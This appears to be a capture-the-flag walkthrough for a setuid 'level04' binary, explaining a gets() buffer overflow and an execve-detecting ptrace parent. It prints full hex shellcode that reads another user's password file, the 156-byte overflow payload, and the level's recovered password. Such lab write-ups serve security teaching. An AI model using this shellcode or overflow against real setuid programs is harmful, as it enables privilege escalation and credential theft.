Level04 Complete Walkthrough
Problem Analysis
SUID binary level04 owned by level05

Uses fork() to create child process

Child process uses ptrace(PTRACE_TRACEME) for anti-debugging

Parent process checks for execve syscall (syscall 11 = 0xb) and kills child if detected

Vulnerable gets() function allows buffer overflow

The Challenge
Cannot use standard /bin/sh shellcode (uses execve syscall)

Need shellcode that reads the flag without execve

Solution Strategy
Use open/read/write shellcode that:

Opens /home/users/level05/.pass

Reads its contents

Writes to stdout (file descriptor 1)

All without using execve syscall

Exploitation Steps
Create shellcode environment variable:

bash
export SHELLCODE=$'\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xeb\x32\x5b\xb0\x05\x31\xc9\xcd\x80\x89\xc6\xeb\x06\xb0\x01\x31\xdb\xcd\x80\x89\xf3\xb0\x03\x83\xec\x01\x8d\x0c\x24\xb2\x01\xcd\x80\x31\xdb\x39\xc3\x74\xe6\xb0\x04\xb3\x01\xb2\x01\xcd\x80\x83\xc4\x01\xeb\xdf\xe8\xc9\xff\xff\xff/home/users/level05/.pass'
Find shellcode address:

bash
# getenv.c
#include <stdio.h>
#include <stdlib.h>
int main() { printf("%p\n", getenv("SHELLCODE")); }

gcc -m32 getenv.c -o getenv
./getenv  # Returns: 0xffffd89e
Build and execute exploit:

bash
python -c "print 'A' * 156 + '\x9e\xd8\xff\xff'" | ./level04
Key Learning
Anti-debugging bypass using ptrace detection evasion

Non-execve shellcode using open/read/write syscalls

Environment variable shellcode injection

Buffer overflow with precise offset (156 bytes)

Little-endian address formatting

Result
Successfully retrieved level05 password: 3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN